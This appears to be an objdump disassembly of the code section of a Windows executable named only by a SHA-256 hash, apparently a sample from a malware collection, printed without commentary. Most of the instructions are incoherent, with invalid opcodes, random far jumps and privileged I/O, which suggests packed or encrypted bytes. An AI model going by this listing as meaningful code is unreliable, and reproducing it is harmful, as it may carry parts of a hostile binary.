
6a85eb1cb93c7b9e15ba2bf5b8ccecc34d60fc883626bb72af009f2bb26ee75b.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	mov    bl,0xdb
  411002:	ret    
  411003:	call   0x3ae9535f
  411008:	int3   
  411009:	cs xchg edi,eax
  41100b:	and    DWORD PTR [ebx+esi*1-0x1528625d],0x4
  411013:	add    DWORD PTR [eax-0x2],esp
  411016:	jl     0x410fde
  411018:	cmp    dl,BYTE PTR [edi+0x1ed3e344]
  41101e:	aas    
  41101f:	mov    dh,0xe7
  411021:	sub    al,0x2f
  411023:	shl    BYTE PTR [edx+ecx*1+0x1c],1
  411027:	or     eax,0x8e938321
  41102c:	rol    BYTE PTR [eax+0x7989e81d],1
  411032:	jge    0x411084
  411034:	mov    esi,0x674debda
  411039:	mov    ds:0x78b59131,al
  41103e:	(bad)  
  41103f:	push   eax
  411040:	imul   ecx,DWORD PTR [ebp-0x6975084a],0xdc3193e
  41104a:	lock or al,0xa4
  41104d:	xor    DWORD PTR [edx+0x2a],ebp
  411050:	push   ds
  411051:	inc    esp
  411052:	lahf   
  411053:	fstp   TBYTE PTR [edx-0x28]
  411056:	cwde   
  411057:	cmp    bl,BYTE PTR [ebp-0x41]
  41105a:	pop    esi
  41105b:	inc    eax
  41105c:	fst    DWORD PTR [esi+ebx*8]
  41105f:	scas   eax,DWORD PTR es:[edi]
  411060:	jmp    0x1f3bc178
  411065:	sar    DWORD PTR [esi],cl
  411067:	mov    bl,0xc9
  411069:	rcr    BYTE PTR [ecx-0x134b0629],1
  41106f:	or     BYTE PTR [ebp-0x44],ch
  411072:	ss cmp eax,0x4a855054
  411078:	xchg   ebx,eax
  411079:	and    al,0x9b
  41107b:	jl     0x4110f0
  41107d:	and    eax,0xa09f0cf0
  411082:	lahf   
  411083:	je     0x4110ab
  411085:	std    
  411086:	xchg   edi,eax
  411087:	popf   
  411088:	pop    ebx
  411089:	outs   dx,BYTE PTR ds:[esi]
  41108a:	test   DWORD PTR [eax+0x4],edx
  41108d:	jo     0x411084
  41108f:	xchg   BYTE PTR [ebp-0x3b077319],ch
  411095:	mov    eax,0x48ac0d70
  41109a:	jo     0x4110a6
  41109c:	in     eax,0x51
  41109e:	dec    edx
  41109f:	dec    edi
  4110a0:	xor    al,0x43
  4110a2:	mov    ah,0xa1
  4110a4:	sbb    esi,DWORD PTR [eax-0x30389ec3]
  4110aa:	sbb    al,0xfd
  4110ac:	into   
  4110ad:	mov    es,WORD PTR [eax]
  4110af:	fdivr  st,st(4)
  4110b1:	pusha  
  4110b2:	jmp    0x67fb:0x6f972ab1
  4110b9:	xchg   ebx,eax
  4110ba:	lea    ecx,[ecx+edx*8+0x244c7c94]
  4110c1:	aad    0x6a
  4110c3:	and    DWORD PTR [edx],edx
  4110c5:	sub    eax,0xbb29d330
  4110ca:	iret   
  4110cb:	cmp    BYTE PTR [edx-0x75fe8856],cl
  4110d1:	loope  0x4110c2
  4110d3:	jmp    0x435c:0x7b3ef310
  4110da:	call   0xe453:0x61dc3483
  4110e1:	sar    BYTE PTR [edx-0x5dce126f],1
  4110e7:	ds or  eax,0xd5406353
  4110ed:	test   BYTE PTR [edx+0x52],dh
  4110f0:	aam    0x33
  4110f2:	rcl    BYTE PTR [ebp+0x4352472b],0xc
  4110f9:	ins    BYTE PTR es:[edi],dx
  4110fa:	repnz and al,0xe8
  4110fd:	iret   
  4110fe:	dec    ebp
  4110ff:	add    eax,0x4ae3cd17
  411104:	lea    ebp,[esi+0x53e0375]
  41110a:	lods   al,BYTE PTR ds:[esi]
  41110b:	hlt    
  41110c:	adc    BYTE PTR [edx-0x480279bb],bh
  411112:	inc    ebx
  411113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411114:	mov    al,ds:0x2f2725dd
  411119:	push   ebp
  41111a:	aad    0x30
  41111c:	stc    
  41111d:	xor    ah,dl
  41111f:	fcom   QWORD PTR [ebp+0x56]
  411122:	aas    
  411123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411124:	sub    eax,0xb66e90ed
  411129:	jae    0x411157
  41112b:	sub    DWORD PTR [eax-0x1953a2b8],0x48
  411132:	aad    0xf
  411134:	or     DWORD PTR [edi+0x59],esi
  411137:	call   0x7f86:0x86275a32
  41113e:	mov    gs,esp
  411140:	adc    eax,0x89eb54bf
  411145:	mov    bh,al
  411147:	sti    
  411148:	ficom  WORD PTR [esi+0x214ee141]
  41114e:	(bad)  
  41114f:	jecxz  0x411116
  411151:	push   esi
  411152:	ins    DWORD PTR es:[edi],dx
  411153:	popa   
  411154:	ins    BYTE PTR es:[edi],dx
  411155:	jge    0x411125
  411157:	addr16 xor al,0xa2
  41115a:	stc    
  41115b:	sub    BYTE PTR [esi+0x75],bl
  41115e:	push   0x301bacd6
  411163:	or     dh,BYTE PTR [ebx-0x1d]
  411166:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411167:	cmp    ebp,DWORD PTR [edi+0x46932867]
  41116d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41116e:	push   esi
  41116f:	jbe    0x41113a
  411171:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411173:	sbb    DWORD PTR [edi-0x517416df],ebp
  411179:	out    dx,eax
  41117a:	or     al,0xc5
  41117c:	rol    DWORD PTR [eax+0x6e],0x29
  411180:	test   al,0x38
  411182:	push   0xb12149dd
  411187:	test   al,0xb7
  411189:	into   
  41118a:	test   DWORD PTR [ebp-0x3f8c7252],esp
  411190:	jp     0x411157
  411192:	and    eax,0x771fbc91
  411197:	lahf   
  411198:	and    esp,DWORD PTR [edi-0x466372ab]
  41119e:	aaa    
  41119f:	push   ebp
  4111a0:	fstp   QWORD PTR [ebx]
  4111a2:	idiv   BYTE PTR [ebx-0x205a71e1]
  4111a8:	jae    0x411198
  4111aa:	pop    ebx
  4111ab:	mov    WORD PTR [edx-0x6c],?
  4111ae:	dec    ebx
  4111af:	jmp    0xc2b8402f
  4111b4:	xchg   edi,eax
  4111b5:	rol    BYTE PTR [edi+0x23],cl
  4111b8:	pusha  
  4111b9:	ret    
  4111ba:	push   ecx
  4111bb:	aaa    
  4111bc:	rol    DWORD PTR [edi+ebp*2],0x9d
  4111c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111c1:	lock out dx,eax
  4111c3:	rol    al,cl
  4111c5:	and    ah,bh
  4111c7:	out    dx,eax
  4111c8:	and    ecx,DWORD PTR [esi+0x21a01263]
  4111ce:	pusha  
  4111cf:	sti    
  4111d0:	push   edx
  4111d1:	push   edi
  4111d2:	mov    bl,0xa8
  4111d4:	mov    ah,0xe7
  4111d6:	rol    BYTE PTR [eax+0x4f],0xa9
  4111da:	inc    ebp
  4111db:	mov    DWORD PTR [eax-0x44],0x43639a6b
  4111e2:	in     eax,dx
  4111e3:	dec    ebx
  4111e4:	or     al,0xa3
  4111e6:	out    dx,eax
  4111e7:	or     al,0x8f
  4111e9:	fs pop ebp
  4111eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111ec:	clc    
  4111ed:	inc    ebx
  4111ee:	jnp    0x411221
  4111f0:	or     al,0xef
  4111f2:	xchg   esp,eax
  4111f3:	daa    
  4111f4:	jbe    0x4111ec
  4111f6:	aas    
  4111f7:	hlt    
  4111f8:	ins    BYTE PTR es:[edi],dx
  4111f9:	pop    ss
  4111fa:	fiadd  DWORD PTR [edi+edx*8]
  4111fd:	sbb    al,0xf5
  4111ff:	lahf   
  411200:	ret    
  411201:	int    0xfd
  411203:	jmp    0x41121a
  411205:	fstp   TBYTE PTR [edx-0x364b949e]
  41120b:	mov    al,0x77
  41120d:	push   ebp
  41120e:	xchg   esp,eax
  41120f:	addr16 pusha 
  411211:	iret   
  411212:	mov    al,0xd4
  411214:	xchg   edi,eax
  411215:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411216:	or     BYTE PTR [esi+0x11],ch
  411219:	fiadd  DWORD PTR [esp+eax*4-0x70]
  41121d:	or     BYTE PTR [ecx],dl
  41121f:	cmp    ebx,DWORD PTR [ebx+0x3674a0b4]
  411225:	call   0x9c751431
  41122a:	dec    edi
  41122b:	mov    dl,0x2d
  41122d:	pop    eax
  41122e:	mov    edi,0x8eaa351b
  411233:	dec    esp
  411234:	pop    ss
  411235:	sub    al,0xdb
  411237:	jno    0x41123f
  411239:	push   edi
  41123a:	out    dx,eax
  41123b:	and    al,0xd8
  41123d:	outs   dx,BYTE PTR ds:[esi]
  41123e:	scas   al,BYTE PTR es:[edi]
  41123f:	xchg   esp,eax
  411240:	ds sub al,0x6e
  411243:	add    cl,BYTE PTR [eax]
  411245:	arpl   WORD PTR [edx],sp
  411247:	lea    edi,[eax+0x6c]
  41124a:	jae    0x411259
  41124c:	and    DWORD PTR [ebx+ecx*4+0x5c],eax
  411250:	xchg   ecx,eax
  411251:	xor    DWORD PTR [ebx+edx*4],0x6f
  411255:	pushf  
  411256:	fs inc ebx
  411258:	out    0x80,eax
  41125a:	es cmp al,0xcb
  41125d:	cmp    BYTE PTR [ecx+0x61d2190],cl
  411263:	cld    
  411264:	cld    
  411265:	leave  
  411266:	adc    DWORD PTR [edi],ecx
  411268:	(bad)  
  411269:	inc    edx
  41126a:	into   
  41126b:	int3   
  41126c:	push   ecx
  41126d:	in     al,dx
  41126e:	push   ss
  41126f:	in     al,0xce
  411271:	jno    0x411278
  411273:	mov    ebp,0xa003220a
  411278:	test   al,0x51
  41127a:	pop    ds
  41127b:	mov    ebp,0xf8d60805
  411280:	aaa    
  411281:	jb     0x4112f2
  411283:	mov    ds:0x6479632f,al
  411288:	and    BYTE PTR [edi-0x53ff0428],ch
  41128e:	dec    esi
  41128f:	int3   
  411290:	add    BYTE PTR [edx-0x7dc752f0],bl
  411296:	cmp    BYTE PTR [ecx+0x21e59561],cl
  41129c:	retf   0x64b5
  41129f:	mov    bh,0xde
  4112a1:	pop    ebx
  4112a2:	push   edx
  4112a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112a4:	jno    0x411233
  4112a6:	jge    0x411276
  4112a8:	mov    al,0xb5
  4112aa:	add    DWORD PTR [ebx+0x12],edi
  4112ad:	out    0x2f,al
  4112af:	int    0xe5
  4112b1:	xchg   ecx,eax
  4112b2:	mov    cl,0xa6
  4112b4:	imul   DWORD PTR ss:[esp+edi*8+0xd]
  4112b9:	sbb    eax,0xe74a00e
  4112be:	mov    dl,0x76
  4112c0:	jmp    0x7ef1e970
  4112c5:	or     edx,ecx
  4112c7:	inc    esi
  4112c8:	push   es
  4112c9:	jmp    0x2567:0x5aa9854d
  4112d0:	cmp    BYTE PTR [ebx+0x547b30c8],al
  4112d6:	push   ss
  4112d7:	pop    ebp
  4112d8:	pusha  
  4112d9:	cdq    
  4112da:	xlat   BYTE PTR ds:[ebx]
  4112db:	cmp    ebx,DWORD PTR [esi]
  4112dd:	cmp    al,0x8f
  4112df:	mov    eax,?
  4112e1:	mov    edi,eax
  4112e3:	pop    esp
  4112e4:	retf   
  4112e5:	mov    bh,0xc9
  4112e7:	ret    0x6705
  4112ea:	mov    edx,0x83ba6875
  4112ef:	es mov ch,0x37
  4112f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112f3:	jb     0x41127b
  4112f5:	js     0x411330
  4112f7:	lods   al,BYTE PTR ds:[esi]
  4112f8:	(bad)  [ebx+0x7]
  4112fb:	sbb    DWORD PTR [ebp+0x10dd3df7],0x19
  411302:	adc    eax,0xefac096f
  411307:	mov    DWORD PTR [edi],ebx
  411309:	push   ecx
  41130a:	pop    ebp
  41130b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41130c:	test   al,0xc2
  41130e:	int    0x9a
  411310:	cmp    ebp,ecx
  411312:	push   0x66886fa
  411317:	pop    ss
  411318:	cwde   
  411319:	cld    
  41131a:	test   al,0x60
  41131c:	scas   al,BYTE PTR es:[edi]
  41131d:	inc    edx
  41131e:	imul   eax,ecx,0x5b
  411321:	adc    eax,DWORD PTR [edx]
  411323:	mov    ebx,0x6bb1979b
  411328:	scas   eax,DWORD PTR es:[edi]
  411329:	cmp    eax,0xa0b6d04f
  41132e:	in     al,0x36
  411330:	ret    
  411331:	mov    edi,0x85c1069
  411336:	push   edx
  411337:	mov    ah,0xec
  411339:	mov    esp,edx
  41133b:	fsub   st(0),st
  41133d:	jns    0x411396
  41133f:	dec    edi
  411340:	sub    eax,eax
  411342:	add    eax,0xc79df9e
  411347:	lods   eax,DWORD PTR ds:[esi]
  411348:	push   edx
  411349:	adc    eax,0x5da469a1
  41134e:	add    ebx,DWORD PTR [eax+ecx*2-0x38]
  411352:	leave  
  411353:	push   0xdf9da6af
  411358:	pop    ebx
  411359:	mov    dh,0x65
  41135b:	cdq    
  41135c:	inc    esi
  41135d:	sub    DWORD PTR [esi],edi
  41135f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411360:	fdivr  QWORD PTR [edx]
  411362:	add    edi,DWORD PTR [eax+0x58f3a473]
  411368:	xchg   ecx,eax
  411369:	or     eax,0x6276a2d3
  41136e:	push   edi
  41136f:	dec    edi
  411370:	or     DWORD PTR [edi+0x1c],0xffffffd6
  411374:	sbb    ch,0xc7
  411377:	mov    WORD PTR [eax-0x7b],cs
  41137a:	call   0x61b9b8f6
  41137f:	call   0x4461:0x5d1c800e
  411386:	push   0xcf0dc7ff
  41138b:	pop    eax
  41138c:	xor    DWORD PTR cs:[ecx],edi
  41138f:	mov    ebx,ebp
  411391:	mov    dl,0xb6
  411393:	data16 js 0x411385
  411396:	test   DWORD PTR [ecx],0xe60a3293
  41139c:	push   cs
  41139d:	out    0xe8,eax
  41139f:	imul   ecx,DWORD PTR [ebp-0x38a80f3d],0xf5fc2e27
  4113a9:	add    al,0x1c
  4113ab:	imul   esi,DWORD PTR [ecx-0x4d],0x21
  4113af:	cmp    BYTE PTR [eax+0x2c1a4c31],cl
  4113b5:	cmp    DWORD PTR [ecx],edx
  4113b7:	push   esp
  4113b8:	retf   0xd8e1
  4113bb:	pop    ecx
  4113bc:	arpl   WORD PTR [ecx],sp
  4113be:	ror    DWORD PTR [ebx-0x5d],1
  4113c1:	mov    dl,0x38
  4113c3:	in     eax,0xf6
  4113c5:	ins    BYTE PTR es:[edi],dx
  4113c6:	(bad)  
  4113c7:	(bad)  
  4113c9:	jmp    0x1752:0xe9486ffc
  4113d0:	cmc    
  4113d1:	enter  0x53ee,0xbd
  4113d5:	call   0xa8fe6ad3
  4113da:	lods   eax,DWORD PTR fs:[esi]
  4113dc:	rcr    DWORD PTR [ebp+0x6352b8f1],cl
  4113e2:	cs dec ebx
  4113e4:	cli    
  4113e5:	sbb    edx,DWORD PTR [ebx+0x57]
  4113e8:	dec    ebp
  4113e9:	sti    
  4113ea:	icebp  
  4113eb:	add    ah,BYTE PTR [esi+0x50795af5]
  4113f1:	loopne 0x411430
  4113f3:	lea    edi,[edx-0x70]
  4113f6:	sub    dh,BYTE PTR [eax+esi*2]
  4113f9:	sub    eax,0x379740f7
  4113fe:	ficom  DWORD PTR [ecx+edx*1]
  411401:	cmp    al,0x52
  411403:	and    ebp,DWORD PTR [ebx]
  411405:	outs   dx,DWORD PTR ds:[esi]
  411406:	in     eax,dx
  411407:	cmc    
  411408:	or     BYTE PTR [edx],cl
  41140a:	shl    BYTE PTR [ebx],1
  41140c:	ror    BYTE PTR [ebp-0x3b],0xdf
  411410:	sahf   
  411411:	fisubr WORD PTR [esi]
  411413:	sub    DWORD PTR [eax-0x78],ebp
  411416:	les    ebp,FWORD PTR [edi+edi*8-0x1a0b833f]
  41141d:	fcomi  st,st(3)
  41141f:	push   esp
  411420:	and    BYTE PTR [edx],0x28
  411423:	dec    eax
  411424:	imul   edx,ecx,0xbe91dff
  41142a:	mov    ds:0xe31d7c3b,eax
  41142f:	fs push edx
  411431:	iret   
  411432:	iret   
  411433:	ins    DWORD PTR es:[edi],dx
  411434:	popa   
  411435:	cmp    eax,0x770a9a5e
  41143a:	call   0xf9aa39fa
  41143f:	sub    bl,BYTE PTR [ecx-0x27]
  411442:	cld    
  411443:	push   ds
  411444:	stc    
  411445:	icebp  
  411446:	sub    DWORD PTR [ebx+ebp*4],esp
  411449:	cmp    eax,0x2e23f930
  41144e:	out    dx,al
  41144f:	stc    
  411450:	adc    bh,BYTE PTR [esi]
  411452:	das    
  411453:	pop    es
  411454:	icebp  
  411455:	pop    ecx
  411456:	pushf  
  411457:	call   0xb66d4a60
  41145c:	sbb    eax,0xe3f312dc
  411461:	pop    esp
  411462:	out    0x2c,al
  411464:	push   esi
  411465:	sbb    al,0xeb
  411467:	(bad)  
  411468:	(bad)  
  411469:	mov    ebp,0x725d3937
  41146e:	ss push edx
  411470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411471:	xchg   edi,eax
  411472:	pop    eax
  411473:	test   eax,0x609b7896
  411478:	jbe    0x41141d
  41147a:	pop    edi
  41147b:	jne    0x41147f
  41147d:	add    eax,0xdc2ad075
  411482:	sub    dl,BYTE PTR [ebx+0x480131a0]
  411488:	sub    al,0x90
  41148a:	inc    eax
  41148b:	mov    ah,al
  41148d:	add    dl,BYTE PTR ds:0xe36af5c8
  411493:	push   0x7bf672d8
  411498:	int3   
  411499:	repnz repnz add ecx,ebp
  41149d:	xchg   edx,eax
  41149e:	jmp    0x411469
  4114a0:	aas    
  4114a1:	or     BYTE PTR [ecx-0x45],dl
  4114a4:	loope  0x4114de
  4114a6:	add    BYTE PTR ds:0xf273c8b5,dh
  4114ac:	popa   
  4114ad:	xor    ah,bh
  4114af:	hlt    
  4114b0:	ror    DWORD PTR [edi],1
  4114b2:	mov    al,0x3b
  4114b4:	sub    BYTE PTR [edx+ecx*4],ch
  4114b7:	ja     0x411455
  4114b9:	cmp    BYTE PTR [ebx],ah
  4114bb:	leave  
  4114bc:	cmp    ebx,0xde631a76
  4114c2:	pop    ebx
  4114c3:	push   es
  4114c4:	sbb    eax,0x74ea26be
  4114ca:	stc    
  4114cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114cc:	(bad)  
  4114cd:	lock dec ebp
  4114cf:	mov    ecx,0xe7669679
  4114d4:	es (bad) 
  4114d6:	iret   
  4114d7:	shl    dh,0x87
  4114da:	jns    0x411463
  4114dc:	hlt    
  4114dd:	pop    edx
  4114de:	in     eax,dx
  4114df:	jae    0x41149b
  4114e1:	jecxz  0x41150a
  4114e3:	jmp    0x4114d1
  4114e5:	push   0xffffff98
  4114e7:	lahf   
  4114e8:	xchg   edx,eax
  4114e9:	jne    0x4114a7
  4114eb:	push   ebp
  4114ec:	mov    ebp,0x5509ab43
  4114f1:	sub    al,0x6d
  4114f3:	pop    eax
  4114f4:	cmp    eax,0xd6e2354e
  4114f9:	sub    ch,dl
  4114fb:	xor    bh,BYTE PTR [eax+0x2c]
  4114fe:	ret    
  4114ff:	pop    ecx
  411500:	cdq    
  411501:	adc    ch,BYTE PTR [esi]
  411503:	repnz sub DWORD PTR [esi],0xffffff9a
  411507:	mov    eax,0x9ba0f709
  41150c:	cmp    eax,0x96e2a28d
  411511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411512:	imul   dh
  411514:	xchg   edx,eax
  411515:	into   
  411516:	fs pop ecx
  411518:	jle    0x41154e
  41151a:	sub    BYTE PTR ds:[eax+0x3f],bl
  41151e:	aam    0x6e
  411520:	retf   0xb17
  411523:	mov    dl,0xdd
  411525:	push   es
  411526:	cmp    bl,BYTE PTR [eax]
  411528:	lahf   
  411529:	fwait
  41152a:	imul   DWORD PTR [ebx]
  41152c:	retf   
  41152d:	or     DWORD PTR [si],ebx
  411530:	sbb    BYTE PTR [eax+esi*1],dl
  411533:	xchg   esi,eax
  411534:	xor    DWORD PTR [edi],edx
  411536:	(bad)  
  411537:	pushf  
  411538:	mov    ah,0xd8
  41153a:	cmp    al,BYTE PTR ds:0x2099d615
  411540:	int    0xbe
  411542:	int3   
  411543:	mov    dh,0x52
  411545:	sub    eax,0x71f30cf4
  41154a:	adc    al,0x27
  41154c:	jne    0x4115a7
  41154e:	mov    eax,ds:0x12acd9b2
  411553:	adc    DWORD PTR [esi+edx*8+0x37],esi
  411557:	add    ebx,DWORD PTR [ebp-0x3f2e38f1]
  41155d:	dec    ebp
  41155e:	repz stc 
  411560:	ffreep st(4)
  411562:	sbb    DWORD PTR [eax+edi*2-0x66eb5857],eax
  411569:	push   edi
  41156a:	mov    esp,0xc28374ce
  41156f:	add    DWORD PTR [edi],esp
  411571:	aad    0xb1
  411573:	or     al,0xd0
  411575:	push   ecx
  411576:	dec    edx
  411577:	ins    DWORD PTR es:[edi],dx
  411578:	repnz test BYTE PTR [ebp+0x44844242],dl
  41157f:	aaa    
  411580:	js     0x411522
  411582:	push   0x94b5bfc8
  411587:	leave  
  411588:	popa   
  411589:	xor    BYTE PTR [eax-0x6a],bh
  41158c:	test   al,0x11
  41158e:	or     eax,0x37934097
  411593:	inc    ebx
  411594:	push   eax
  411595:	pop    ebp
  411596:	mov    al,ds:0x101cb89e
  41159b:	popf   
  41159c:	add    cl,BYTE PTR [edx-0x5d10d443]
  4115a2:	sbb    al,0xc9
  4115a4:	and    al,0x2
  4115a6:	dec    edi
  4115a7:	push   cs
  4115a8:	pop    esi
  4115a9:	and    DWORD PTR [ebx-0x35],ebp
  4115ac:	inc    edx
  4115ad:	inc    eax
  4115ae:	sub    DWORD PTR [esi+ebx*1],0x62ccdc34
  4115b5:	rol    ebx,1
  4115b7:	sbb    al,BYTE PTR [esi+0x381d1a75]
  4115bd:	push   edx
  4115be:	cdq    
  4115bf:	clc    
  4115c0:	push   0x20
  4115c2:	jle    0x4115d9
  4115c4:	ins    DWORD PTR es:[edi],dx
  4115c5:	add    DWORD PTR [edx-0x5f],0xffffffad
  4115c9:	xor    DWORD PTR [esi-0xd7d2bc8],esp
  4115cf:	cmc    
  4115d0:	out    dx,al
  4115d1:	adc    eax,0x6b9e4d7b
  4115d6:	fsubr  QWORD PTR [ebx]
  4115d8:	add    eax,0xea4de846
  4115dd:	imul   edx,DWORD PTR [eax],0xa76f450d
  4115e3:	adc    eax,0xcc62e33
  4115e8:	cmp    eax,0x4e
  4115eb:	fcomi  st,st(7)
  4115ed:	inc    esp
  4115ee:	fxch   st(7)
  4115f1:	mov    WORD PTR [edi*1-0x545bfb7d],?
  4115f8:	jno    0x41158b
  4115fa:	cmp    DWORD PTR [ecx],0x54
  4115fd:	and    eax,esp
  4115ff:	jns    0x4115d2
  411601:	iret   
  411602:	adc    al,BYTE PTR [ebp-0x542b2936]
  411608:	aas    
  411609:	fucomp st(6)
  41160b:	scas   al,BYTE PTR es:[edi]
  41160c:	add    ebx,edx
  41160e:	sub    bh,BYTE PTR [ecx+0x1e900940]
  411614:	adc    al,0xcc
  411616:	mov    ch,0x8e
  411618:	mov    esp,0x852f1fa3
  41161d:	sti    
  41161e:	xor    bl,ch
  411620:	not    BYTE PTR [edx-0x36]
  411623:	fnstenv [edi+ecx*8+0x70]
  411627:	mov    DWORD PTR [ebx],edi
  411629:	out    dx,al
  41162a:	icebp  
  41162b:	int    0x44
  41162d:	mov    edx,0x1f676680
  411632:	xchg   DWORD PTR [edi],esi
  411634:	je     0x41167e
  411636:	push   es
  411637:	xor    al,0xd0
  411639:	pusha  
  41163a:	aas    
  41163b:	adc    ebp,DWORD PTR [eax+0x28]
  41163e:	jle    0x411636
  411640:	adc    eax,edx
  411642:	xchg   DWORD PTR [esi],eax
  411644:	je     0x41168a
  411646:	adc    edi,DWORD PTR [edi]
  411648:	mov    dl,0xf6
  41164a:	out    dx,eax
  41164b:	cmp    BYTE PTR [edx+0x6c2fbd0d],0x74
  411652:	fdivr  DWORD PTR [esi]
  411654:	sub    al,0x51
  411656:	xchg   esi,eax
  411657:	cmp    dh,BYTE PTR [eax-0x47]
  41165a:	xor    edx,DWORD PTR ds:0x6624a2a9
  411660:	in     al,dx
  411661:	mov    esi,0xc53713e9
  411666:	scas   eax,DWORD PTR es:[edi]
  411667:	fbstp  TBYTE PTR [edi]
  411669:	add    DWORD PTR [esi+0x21],edi
  41166c:	jecxz  0x41164b
  41166e:	mov    esi,0x6af0e22a
  411673:	gs add al,0x92
  411676:	je     0x411686
  411678:	cmp    dh,BYTE PTR [ebp+eax*2+0x5dd3011d]
  41167f:	mov    bl,0x14
  411681:	inc    esi
  411682:	fidiv  DWORD PTR [ecx+0x3ee243a5]
  411688:	mov    ebx,0x7a0737e1
  41168d:	dec    edx
  41168e:	fisttp WORD PTR [eax-0x19]
  411691:	adc    DWORD PTR [esi+edx*2+0x149f0f55],edx
  411698:	cmp    eax,0xf3210c11
  41169d:	push   edi
  41169e:	inc    edi
  41169f:	lds    eax,FWORD PTR [esi-0xabae7bc]
  4116a5:	ds mov bh,0x17
  4116a8:	pop    ebx
  4116a9:	pop    esp
  4116aa:	and    BYTE PTR [ebx],dl
  4116ac:	sub    BYTE PTR [ebx-0x7f],ah
  4116af:	call   0x6e8a:0x9e4ced7f
  4116b6:	call   0xf672:0x1b043d51
  4116bd:	imul   edi,DWORD PTR [ecx+0x4c],0x78355e1e
  4116c4:	adc    al,0xfc
  4116c6:	hlt    
  4116c7:	xlat   BYTE PTR ds:[ebx]
  4116c8:	xchg   edi,eax
  4116c9:	dec    ebx
  4116ca:	addr16 mov ch,0x7
  4116cd:	or     al,0xe8
  4116cf:	inc    esi
  4116d0:	jecxz  0x4116a7
  4116d2:	xor    edi,DWORD PTR [ebx+0x46a220f4]
  4116d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116d9:	jb     0x411688
  4116db:	call   0x4c2:0xaf848677
  4116e2:	push   ss
  4116e3:	arpl   WORD PTR [edi+0x4abd6d12],sp
  4116e9:	xor    DWORD PTR [esi-0x3a65b39f],edx
  4116ef:	les    esp,FWORD PTR [edi-0x30e4cd4a]
  4116f5:	push   es
  4116f6:	adc    ebx,DWORD PTR [esi+0x1d7d110]
  4116fc:	sahf   
  4116fd:	xor    al,0xa9
  4116ff:	nop
  411700:	push   cs
  411701:	mov    ecx,0x91228782
  411706:	test   DWORD PTR ss:[esi],esi
  411709:	adc    edx,DWORD PTR [edx-0x278fc332]
  41170f:	cmp    DWORD PTR [esi+edx*2-0x4ae3dfec],edi
  411716:	fimul  DWORD PTR [ecx-0x50]
  411719:	or     DWORD PTR [edx+0x6656cb4d],edi
  41171f:	sti    
  411720:	add    al,0x67
  411722:	ins    DWORD PTR es:[edi],dx
  411723:	out    0x38,al
  411725:	sbb    DWORD PTR [eax-0x3f],eax
  411728:	and    dh,dh
  41172a:	adc    eax,0x82690dd9
  41172f:	jnp    0x4116fc
  411731:	lock inc edx
  411733:	into   
  411734:	push   esi
  411735:	sbb    ecx,eax
  411737:	add    cl,BYTE PTR [ebp-0x701531a1]
  41173d:	push   ebx
  41173e:	ins    DWORD PTR es:[edi],dx
  41173f:	or     eax,0x92054b05
  411744:	mov    al,0x4c
  411746:	daa    
  411747:	cwde   
  411748:	add    BYTE PTR [esi+0xa],ch
  41174b:	add    esi,ebp
  41174d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41174e:	loop   0x411745
  411750:	inc    ebp
  411751:	(bad)  
  411753:	add    eax,0x89b1bcf1
  411758:	and    al,0x60
  41175a:	out    0x9e,eax
  41175c:	mov    dl,0xab
  41175e:	dec    ecx
  41175f:	les    edi,FWORD PTR [esi]
  411761:	inc    BYTE PTR [edx-0x4f2e93c4]
  411767:	xor    BYTE PTR [edi+0x27],ch
  41176a:	sub    ebp,ebx
  41176c:	in     eax,dx
  41176d:	mov    edx,0x4c63d547
  411772:	ja     0x4116f6
  411774:	push   ds
  411775:	sbb    eax,0x67f5343
  41177a:	outs   dx,BYTE PTR ds:[esi]
  41177b:	les    ebp,FWORD PTR [ebp-0x10]
  41177e:	mov    bh,0x39
  411780:	jno    0x411716
  411782:	enter  0xfac3,0x59
  411786:	jp     0x411795
  411788:	mov    ds:0x811e5d9e,al
  41178d:	iret   
  41178e:	neg    edx
  411790:	aam    0x92
  411792:	je     0x41176c
  411794:	call   0x75b8:0x6c93c096
  41179b:	mov    ds:0x867e1873,al
  4117a0:	test   BYTE PTR [ebx-0x72],al
  4117a3:	mov    WORD PTR [esi+0x4b],cs
  4117a6:	mov    al,0x2c
  4117a8:	sbb    BYTE PTR [edi],0x39
  4117ab:	ins    DWORD PTR es:[edi],dx
  4117ac:	pop    es
  4117ad:	loope  0x41175e
  4117af:	jne    0x41173e
  4117b1:	mov    esi,DWORD PTR [esi+0x55]
  4117b4:	and    ebp,ebx
  4117b6:	inc    ecx
  4117b7:	mov    ebp,0x11836d0a
  4117bc:	pop    ecx
  4117bd:	scas   al,BYTE PTR es:[edi]
  4117be:	inc    esp
  4117bf:	repnz popa 
  4117c1:	and    BYTE PTR [ebp-0x23],al
  4117c4:	aad    0x3e
  4117c6:	call   0xb6ad:0x2eab2bdf
  4117cd:	into   
  4117ce:	das    
  4117cf:	adc    cl,BYTE PTR [ebx-0x30]
  4117d2:	or     al,0xcc
  4117d4:	in     al,0xd4
  4117d6:	repz mov cs:0x52ad6cc6,eax
  4117dd:	ja     0x4117df
  4117df:	dec    ebp
  4117e0:	jle    0x411823
  4117e2:	jne    0x4117d5
  4117e4:	xlat   BYTE PTR ds:[ebx]
  4117e5:	mov    ah,0xfa
  4117e7:	cmp    DWORD PTR [esi],ebp
  4117e9:	fsubr  st(0),st
  4117eb:	aam    0x54
  4117ed:	je     0x411812
  4117ef:	inc    esp
  4117f0:	fadd   QWORD PTR [edi+eax*4+0x4ba3da11]
